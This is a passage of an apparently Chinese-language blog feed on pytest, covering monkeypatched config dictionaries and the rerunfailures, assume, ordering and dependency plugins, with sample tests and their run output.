test.</span><br>    monkeypatch.setitem(app.DEFAULT_CONFIG, <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;test_user&quot;</span>)<br>    monkeypatch.setitem(app.DEFAULT_CONFIG, <span class="hljs-string">&quot;database&quot;</span>, <span class="hljs-string">&quot;test_db&quot;</span>)<br><br>    <span class="hljs-comment"># expected result based on the mocks</span><br>    expected = <span class="hljs-string">&quot;User Id=test_user; Location=test_db;&quot;</span><br><br>    <span class="hljs-comment"># the test uses the monkeypatched dictionary settings</span><br>    result = app.create_connection_string()<br>    <span class="hljs-keyword">assert</span> result == expected<br></code></pre></td></tr></table></figure><p>您可以使用<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delitem"><code>monkeypatch.delitem</code></a>来删除值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_app.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-comment"># app.py with the connection string function</span><br><span class="hljs-keyword">import</span> app<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_missing_user</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-comment"># patch the DEFAULT_CONFIG t be missing the &#x27;user&#x27; key</span><br>    monkeypatch.delitem(app.DEFAULT_CONFIG, <span class="hljs-string">&quot;user&quot;</span>, raising=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment"># Key error expected because a config is not passed, and the</span><br>    <span class="hljs-comment"># default is now missing the &#x27;user&#x27; entry.</span><br>    <span class="hljs-keyword">with</span> pytest.raises(KeyError):<br>        _ = app.create_connection_string()<br></code></pre></td></tr></table></figure><p>装置的模块化使您可以灵活地为每个潜在模拟定义单独的装置，并在所需的测试中引用它们。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_app.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-comment"># app.py with the connection string function</span><br><span class="hljs-keyword">import</span> app<br><br><br><span class="hljs-comment"># all of the mocks are moved into separated fixtures</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_test_user</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Set the DEFAULT_CONFIG user to test_user.&quot;&quot;&quot;</span><br>    monkeypatch.setitem(app.DEFAULT_CONFIG, <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;test_user&quot;</span>)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_test_database</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Set the DEFAULT_CONFIG database to test_db.&quot;&quot;&quot;</span><br>    monkeypatch.setitem(app.DEFAULT_CONFIG, <span class="hljs-string">&quot;database&quot;</span>, <span class="hljs-string">&quot;test_db&quot;</span>)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_missing_default_user</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Remove the user key from DEFAULT_CONFIG&quot;&quot;&quot;</span><br>    monkeypatch.delitem(app.DEFAULT_CONFIG, <span class="hljs-string">&quot;user&quot;</span>, raising=<span class="hljs-literal">False</span>)<br><br><br><span class="hljs-comment"># tests reference only the fixture mocks that are needed</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_connection</span>(<span class="hljs-params">mock_test_user, mock_test_database</span>):<br>    expected = <span class="hljs-string">&quot;User Id=test_user; Location=test_db;&quot;</span><br><br>    result = app.create_connection_string()<br>    <span class="hljs-keyword">assert</span> result == expected<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_missing_user</span>(<span class="hljs-params">mock_missing_default_user</span>):<br>    <span class="hljs-keyword">with</span> pytest.raises(KeyError):<br>        _ = app.create_connection_string()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python 之 pytest 常用插件（八）</title>
    <link href="/2024/01/20/668python-%E4%B9%8B-pytest-%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%EF%BC%88%E5%85%AB%EF%BC%89/"/>
    <url>/2024/01/20/668python-%E4%B9%8B-pytest-%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%EF%BC%88%E5%85%AB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="一些pytest常用插件介绍"><a href="#一些pytest常用插件介绍" class="headerlink" title="一些pytest常用插件介绍"></a>一些pytest常用插件介绍</h1><p>[TOC]</p><h2 id="1、失败重跑"><a href="#1、失败重跑" class="headerlink" title="1、失败重跑"></a>1、失败重跑</h2><p>安装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install pytest-rerunfailures<br></code></pre></td></tr></table></figure><p>使用方式一：命令行使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pytest test_class.py --reruns 5 --reruns-delay 1 -vs  #（失败后重新运行5次，每次间隔1秒）<br>pytest  --reruns 5 --reruns-delay 1 -vs test_class.py # 或者放前面也行<br></code></pre></td></tr></table></figure><p>测试代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&#x27;x,y,result&#x27;</span>, [</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.2</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params">-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">2</span></span>)</span></span><br><span class="hljs-params"><span class="hljs-meta">], ids=[<span class="hljs-string">&#x27;err&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;bignum&#x27;</span>, <span class="hljs-string">&#x27;float&#x27;</span>, <span class="hljs-string">&#x27;negative&#x27;</span>]</span>)  </span><span class="hljs-comment"># 参数化</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_add</span>(<span class="hljs-params">x, y, result</span>):<br>    <span class="hljs-keyword">assert</span> result == x + y<br><br></code></pre></td></tr></table></figure><p>命令行运行及结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest --reruns <span class="hljs-number">5</span> --reruns-delay <span class="hljs-number">1</span> -sv testcases/test_rerun.py::test_add<br><span class="hljs-comment"># 或者 pytest testcases/test_rerun.py::test_add --reruns 5 --reruns-delay 1 -sv </span><br>============================= test session starts ==============================<br><span class="hljs-comment"># 运行结果和下面方式二的一致</span><br>=========================== short test summary info ============================<br>FAILED testcases/test_rerun.py::test_add[int0] - <span class="hljs-keyword">assert</span> <span class="hljs-number">4</span> == (<span class="hljs-number">1</span> + <span class="hljs-number">2</span>)<br>===================== <span class="hljs-number">1</span> failed, <span class="hljs-number">4</span> passed, <span class="hljs-number">5</span> rerun <span class="hljs-keyword">in</span> <span class="hljs-number">5.06</span>s =====================<br>Finished running tests!<br></code></pre></td></tr></table></figure><p>使用方式二：装饰器装饰后运行【这个比较好用】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&#x27;x,y,result&#x27;</span>, [</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params"><span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.2</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">    (<span class="hljs-params">-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">2</span></span>)</span></span><br><span class="hljs-params"><span class="hljs-meta">], ids=[<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;bignum&#x27;</span>, <span class="hljs-string">&#x27;float&#x27;</span>, <span class="hljs-string">&#x27;fushu&#x27;</span>]</span>)  </span><span class="hljs-comment"># 参数化</span><br><span class="hljs-meta">@pytest.mark.flaky(<span class="hljs-params">reruns=<span class="hljs-number">3</span>, reruns_delay=<span class="hljs-number">2</span></span>) </span><span class="hljs-comment"># 这里的flaky是pytest-rerunfailures插件提供的在makr函数上动态添加的属性，__getattr__方法可以获取属性</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_add</span>(<span class="hljs-params">x, y, result</span>):<br>    <span class="hljs-keyword">assert</span> result == x + y<br></code></pre></td></tr></table></figure><p>输出结果两者一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/fastApiStudy/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/code/fastApiStudy<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span>, rerunfailures-<span class="hljs-number">14.0</span><br>collecting ... collected <span class="hljs-number">5</span> items<br><br>testcases/test_rerun.py::test_add[bignum] PASSED<br>testcases/test_rerun.py::test_add[fushu] PASSED<br>testcases/test_rerun.py::test_add[<span class="hljs-built_in">float</span>] PASSED<br>testcases/test_rerun.py::test_add[int1] PASSED<br>testcases/test_rerun.py::test_add[int0] RERUN<br>testcases/test_rerun.py::test_add[int0] RERUN<br>testcases/test_rerun.py::test_add[int0] RERUN<br>testcases/test_rerun.py::test_add[int0] RERUN<br>testcases/test_rerun.py::test_add[int0] RERUN<br>testcases/test_rerun.py::test_add[int0] FAILED<br><br>=================================== FAILURES ===================================<br>________________________________ test_add[int0] ________________________________<br><br>x = <span class="hljs-number">1</span>, y = <span class="hljs-number">2</span>, result = <span class="hljs-number">4</span><br><br><span class="hljs-meta">    @pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&#x27;x,y,result&#x27;</span>, [</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params"><span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.2</span></span>),</span></span><br><span class="hljs-params"><span class="hljs-meta">        (<span class="hljs-params">-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">2</span></span>)</span></span><br><span class="hljs-params"><span class="hljs-meta">    ], ids=[<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;bignum&#x27;</span>, <span class="hljs-string">&#x27;float&#x27;</span>, <span class="hljs-string">&#x27;fushu&#x27;</span>]</span>)  </span><span class="hljs-comment"># 参数化</span><br><span class="hljs-meta">    @pytest.mark.flaky(<span class="hljs-params">reruns=<span class="hljs-number">5</span>, reruns_delay=<span class="hljs-number">1</span></span>) </span><span class="hljs-comment"># 这里的flaky是pytest-rerunfailures插件提供的在makr函数上动态添加的属性，__getattr__方法可以获取属性</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_add</span>(<span class="hljs-params">x, y, result</span>):<br>&gt;       <span class="hljs-keyword">assert</span> result == x + y<br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">4</span> == (<span class="hljs-number">1</span> + <span class="hljs-number">2</span>)<br><br>testcases/test_rerun.py:<span class="hljs-number">13</span>: AssertionError<br>=========================== short test summary info ============================<br>FAILED testcases/test_rerun.py::test_add[int0] - <span class="hljs-keyword">assert</span> <span class="hljs-number">4</span> == (<span class="hljs-number">1</span> + <span class="hljs-number">2</span>)<br>===================== <span class="hljs-number">1</span> failed, <span class="hljs-number">4</span> passed, <span class="hljs-number">5</span> rerun <span class="hljs-keyword">in</span> <span class="hljs-number">5.06</span>s =====================<br>Finished running tests!<br></code></pre></td></tr></table></figure><h2 id="2、多重校验pytest-assume"><a href="#2、多重校验pytest-assume" class="headerlink" title="2、多重校验pytest-assume"></a>2、多重校验pytest-assume</h2><p>正常情况在一条测试用例内如果有多条断言，当代码走到某条断言失败了，后面的其他断言就不会继续执行下去了，而使用<code>pytest-assume</code>插件就可以继续执行下去</p><p>但是这个插件感觉没必要，大多数情况下，失败就是失败。不需要继续执行，除非特别情况</p><p>下载安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install pytest-assume<br></code></pre></td></tr></table></figure><p>使用方式：不用特别操作，直接用就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_assume</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1、错误操作&#x27;</span>)<br>    pytest.assume(<span class="hljs-number">1</span> == <span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;2、正确操作&#x27;</span>)<br>    pytest.assume(<span class="hljs-number">2</span> == <span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;3、错误操作&#x27;</span>)<br>    pytest.assume(<span class="hljs-number">3</span> == <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/fastApiStudy/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/code/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span>, assume-<span class="hljs-number">2.4</span><span class="hljs-number">.3</span>, rerunfailures-<span class="hljs-number">14.0</span><br>collecting ... collected <span class="hljs-number">1</span> item<br><br>testcases/test_rerun.py::test_assume <span class="hljs-number">1</span>、错误操作<br><span class="hljs-number">2</span>、正确操作<br><span class="hljs-number">3</span>、错误操作<br>FAILED<br><br>=================================== FAILURES ===================================<br>_________________________________ test_assume __________________________________<br><br>tp = &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;pytest_assume.plugin.FailedAssumption&#x27;</span>&gt;, value = <span class="hljs-literal">None</span>, tb = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reraise</span>(<span class="hljs-params">tp, value, tb=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                value = tp()<br>            <span class="hljs-keyword">if</span> value.__traceback__ <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> tb:<br>&gt;               <span class="hljs-keyword">raise</span> value.with_traceback(tb)<br>E               pytest_assume.plugin.FailedAssumption: <br>E               <span class="hljs-number">2</span> Failed Assumptions:<br>E               <br>E               testcases/test_rerun.py:<span class="hljs-number">17</span>: AssumptionFailure<br>E               &gt;&gt;      pytest.assume(<span class="hljs-number">1</span> == <span class="hljs-number">2</span>)<br>E               AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br>E               <br>E               testcases/test_rerun.py:<span class="hljs-number">21</span>: AssumptionFailure<br>E               &gt;&gt;      pytest.assume(<span class="hljs-number">3</span> == <span class="hljs-number">2</span>)<br>E               AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br><br>venvadmin/lib/python3<span class="hljs-number">.10</span>/site-packages/six.py:<span class="hljs-number">718</span>: FailedAssumption<br>=============================== warnings summary ===============================<br>testcases/test_rerun.py::test_assume<br>  /home/wang/code/fastApiStudy/venvadmin/lib/python3<span class="hljs-number">.10</span>/site-packages/_pytest/runner.py:<span class="hljs-number">240</span>: PluggyTeardownRaisedWarning: A plugin raised an exception during an old-style hookwrapper teardown.<br>  Plugin: assume, Hook: pytest_runtest_call<br>  FailedAssumption: <br>  <span class="hljs-number">2</span> Failed Assumptions:<br>  <br>  testcases/test_rerun.py:<span class="hljs-number">17</span>: AssumptionFailure<br>  &gt;&gt;    pytest.assume(<span class="hljs-number">1</span> == <span class="hljs-number">2</span>)<br>  AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br>  <br>  testcases/test_rerun.py:<span class="hljs-number">21</span>: AssumptionFailure<br>  &gt;&gt;    pytest.assume(<span class="hljs-number">3</span> == <span class="hljs-number">2</span>)<br>  AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br>  <br>  <br>  For more information see https://pluggy.readthedocs.io/en/stable/api_reference.html<span class="hljs-comment">#pluggy.PluggyTeardownRaisedWarning</span><br>    <span class="hljs-keyword">lambda</span>: runtest_hook(item=item, **kwds), when=when, reraise=reraise<br><br>-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html<br>=========================== short test summary info ============================<br>FAILED testcases/test_rerun.py::test_assume - pytest_assume.plugin.FailedAssu...<br>========================= <span class="hljs-number">1</span> failed, <span class="hljs-number">1</span> warning <span class="hljs-keyword">in</span> <span class="hljs-number">0.02</span>s =========================<br>Finished running tests!<br></code></pre></td></tr></table></figure><h2 id="3、设定用例执行顺序-pytest-ordering"><a href="#3、设定用例执行顺序-pytest-ordering" class="headerlink" title="3、设定用例执行顺序 pytest-ordering"></a>3、设定用例执行顺序 pytest-ordering</h2><p>正常情况，用例会按照代码执行顺序，从上而下的执行，使用<code>ordering</code>插件可自定义执行顺序</p><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install  pytest-ordering<br></code></pre></td></tr></table></figure><p>使用方法：在用例上面加装饰器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.mark.run(<span class="hljs-params">order=<span class="hljs-number">2</span></span>) </span><span class="hljs-comment"># 顺序为2号</span><br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.mark.run(<span class="hljs-params">order=<span class="hljs-number">1</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;case1&#x27;</span>)<br><br><span class="hljs-meta">@pytest.mark.run(<span class="hljs-params">order=<span class="hljs-number">4</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case4</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;case4&#x27;</span>)<br>    <br><span class="hljs-meta">@pytest.mark.run(<span class="hljs-params">order=<span class="hljs-number">3</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case3</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;case3&#x27;</span>)<br><br><span class="hljs-meta">@pytest.mark.run(<span class="hljs-params">order=<span class="hljs-number">2</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case2</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;case2&#x27;</span>)<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/fastApiStudy/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/code/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span>, ordering-<span class="hljs-number">0.6</span>, rerunfailures-<span class="hljs-number">14.0</span><br>collecting ... collected <span class="hljs-number">4</span> items<br><br>testcases/test_rerun.py::test_case1 case1<br>PASSED<br>testcases/test_rerun.py::test_case2 case2<br>PASSED<br>testcases/test_rerun.py::test_case3 case3<br>PASSED<br>testcases/test_rerun.py::test_case4 case4<br>PASSED<br><br>============================== <span class="hljs-number">4</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ===============================<br>Finished running tests!<br></code></pre></td></tr></table></figure><h3 id="用例依赖（pytest-dependency）"><a href="#用例依赖（pytest-dependency）" class="headerlink" title="用例依赖（pytest-dependency）"></a>用例依赖（pytest-dependency）</h3><p>使用该插件可以标记一个testcase作为其他testcase的依赖，当依赖项执行失败时，那些依赖它的test将会被跳过。</p><p>安装  ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install pytest-dependency<br></code></pre></td></tr></table></figure><p>使用方法：</p><p> 用 @pytest.mark.dependency()对所依赖的方法进行标记，</p><p>使用@pytest.mark.dependency(depends&#x3D;[“test_name”])引用依赖,test_name可以是多个。</p><p>代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">@pytest.mark.dependency()</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_01</span>():<br>    <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@pytest.mark.dependency(<span class="hljs-params">depends=[<span class="hljs-string">&quot;test_01&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_02</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;执行测试2&quot;</span>)<br></code></pre></td></tr></table></figure><p>执行用例test_02后的运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 